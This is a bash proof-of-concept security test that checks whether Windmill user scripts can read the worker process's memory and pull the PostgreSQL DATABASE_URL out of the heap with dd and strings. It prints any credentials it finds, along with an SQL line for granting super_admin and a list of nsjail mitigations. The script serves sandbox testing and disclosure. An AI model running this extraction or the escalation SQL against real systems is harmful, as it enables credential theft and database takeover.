#!/bin/bash
# Security test: Attempt to extract DATABASE_URL from windmill process memory
# This demonstrates why nsjail sandboxing is critical for production deployments

echo "=== DATABASE_URL Memory Extraction Proof-of-Concept ==="
echo ""
echo "This script demonstrates that without proper sandboxing (nsjail),"
echo "user scripts can potentially extract credentials from process memory."
echo ""

# Find the actual windmill process (not the script runner)
echo "[1/5] Locating windmill process..."
windmill_pid=$(ps aux | grep -E "windmill$|/windmill$|target/(debug|release)/windmill$" | grep -v grep | grep -v node_modules | awk '{print $2}' | head -1)

if [ -z "$windmill_pid" ]; then
    echo "✓ No windmill parent process visible"
    echo "  This is GOOD - means nsjail PID namespace isolation is working!"
    echo ""
    echo "Result: ✅ SECURE - Cannot see parent windmill process"
    exit 0
fi

echo "  Found windmill PID: $windmill_pid"

# Check if we can read the process memory
echo ""
echo "[2/5] Checking memory access permissions..."
if [ ! -r /proc/$windmill_pid/mem ]; then
    echo "✓ Cannot read process memory"
    echo "  This is GOOD - means proper isolation is in place!"
    echo ""
    echo "Result: ✅ SECURE - Memory access blocked"
    exit 0
fi

echo "  ⚠️ Process memory IS readable"

# Get heap memory region
echo ""
echo "[3/5] Identifying heap memory region..."
heap_info=$(grep '\[heap\]' /proc/$windmill_pid/maps 2>/dev/null | head -1)

if [ -z "$heap_info" ]; then
    echo "  Cannot read memory maps"
    echo "Result: ✅ SECURE - Memory maps not accessible"
    exit 0
fi

heap_range=$(echo "$heap_info" | awk '{print $1}')
heap_start=$(echo "$heap_range" | cut -d'-' -f1)
echo "  Heap region: $heap_range"

# Attempt extraction
echo ""
echo "[4/5] Attempting to extract DATABASE_URL from heap..."
echo "  (This may take a few seconds...)"

# Method 1: Using dd + strings on heap region (MOST RELIABLE)
# Direct grep/strings on /proc/mem doesn't work - need dd first
skip_blocks=$((0x$heap_start / 4096))
# Search for postgres URL containing password (more specific to avoid matching script code)
extracted=$(timeout 10 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=10000 2>/dev/null | strings | grep "postgres://.*changeme\|postgres://.*:.*@" | grep -v "extracted=" | head -1)

if [ -z "$extracted" ]; then
    # Method 2: Search for environment variable format (DATABASE_URL=...)
    extracted=$(timeout 10 dd if=/proc/$windmill_pid/mem bs=4096 skip=$skip_blocks count=10000 2>/dev/null | strings | grep "^DATABASE_URL=postgres://" | grep -v "extracted=" | head -1 | cut -d'=' -f2-)
fi

echo ""
echo "[5/5] Extraction results:"
echo ""

if [ -n "$extracted" ]; then
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "❌❌❌ CRITICAL VULNERABILITY ❌❌❌"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "DATABASE_URL successfully extracted from process memory:"
    echo ""
    echo "$extracted"
    echo ""
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "ATTACK IMPACT:"
    echo "  • Attacker obtains full database credentials"
    echo "  • Can connect directly to PostgreSQL"
    echo "  • Can escalate to superadmin via:"
    echo "    UPDATE password SET super_admin=TRUE WHERE username='attacker'"
    echo "  • Full workspace data access and modification"
    echo ""
    echo "EXPLOITATION DIFFICULTY:"
    echo "  • Skill level: LOW (standard Linux tools)"
    echo "  • Time required: < 5 seconds"
    echo "  • Privileges needed: Same UID as worker (default)"
    echo ""
    echo "MITIGATION:"
    echo "  ✅ Enable nsjail sandboxing (default in Windmill EE)"
    echo "  ✅ Run workers as different UID from user scripts"
    echo "  ✅ Treat developers as trusted users"
    echo ""
    exit 1
else
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo "✅ SECURE - DATABASE_URL not found in memory"
    echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo ""
    echo "While process memory was readable, DATABASE_URL was not found."
    echo "This could mean:"
    echo "  • Credentials were cleared from memory"
    echo "  • Stored in non-searchable format"
    echo "  • More sophisticated tools may still succeed"
    echo ""
    echo "RECOMMENDATION: Still use nsjail for defense-in-depth"
    echo ""
fi
